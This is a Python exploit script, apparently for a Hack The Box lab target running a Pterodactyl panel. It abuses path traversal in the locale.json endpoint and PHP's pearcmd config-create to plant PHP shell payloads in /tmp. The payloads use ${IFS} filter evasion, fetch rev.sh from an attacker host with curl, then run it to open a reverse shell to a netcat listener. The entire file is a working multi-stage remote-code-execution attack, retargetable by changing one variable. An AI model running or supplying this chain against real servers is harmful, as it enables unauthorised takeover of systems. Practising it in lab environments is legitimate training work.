import requests
import time
import sys

# --- CONFIGURATION ---
TARGET = "http://panel.pterodactyl.htb"
ATTACKER_IP = "10.10.XX.XX"  # Your tun0 IP
HTTP_PORT = "8081"           # Port for python3 -m http.server
NC_PORT = "4444"             # Port for nc -lvnp
# ---------------------

def exploit():
    print(f"[*] Targeting: {TARGET}")
    print(f"[*] Ensure your HTTP server is on {HTTP_PORT} and Netcat on {NC_PORT}")

    # Stage 1: Write Downloader to /tmp/shell.php
    print("\n[*] Stage 1: Injecting downloader payload...")
    # Using URL-safe formatting for the PHP tags
    downloader = f"<?=system('curl${{IFS}}{ATTACKER_IP}:{HTTP_PORT}/rev.sh${{IFS}}-o${{IFS}}/tmp/rev.sh')?>"
    
    stage1_uri = (
        f"{TARGET}/locales/locale.json?+config-create+/"
        f"&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd"
        f"&{downloader}+/tmp/shell.php"
    )
    
    try:
        requests.get(stage1_uri)
        print("[+] Downloader staged.")
    except Exception as e:
        print(f"[-] Error staging downloader: {e}")
        return

    # Stage 2: Trigger the Download
    print("[*] Stage 2: Triggering curl to fetch rev.sh...")
    trigger_uri = f"{TARGET}/locales/locale.json?locale=../../../../../tmp&namespace=shell"
    requests.get(trigger_uri)
    time.sleep(1) # Wait for the download to complete

    # Stage 3: Write Executor to /tmp/shell.php
    print("[*] Stage 3: Overwriting with execution payload...")
    executor = "<?=system('sh${IFS}/tmp/rev.sh')?>"
    
    stage3_uri = (
        f"{TARGET}/locales/locale.json?+config-create+/"
        f"&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd"
        f"&{executor}+/tmp/shell.php"
    )
    
    try:
        requests.get(stage3_uri)
        print("[+] Executor staged.")
    except Exception as e:
        print(f"[-] Error staging executor: {e}")
        return

    # Stage 4: Pop Shell
    print("[!] Stage 4: Triggering reverse shell... CHECK YOUR LISTENER!")
    try:
        # We use a small timeout because the request hangs once the shell is established
        requests.get(trigger_uri, timeout=5)
    except requests.exceptions.ReadTimeout:
        print("[+] Success! Request timed out (standard for a reverse shell).")
    except Exception as e:
        print(f"[-] Execution triggered, but encountered: {e}")

if __name__ == "__main__":
    exploit()
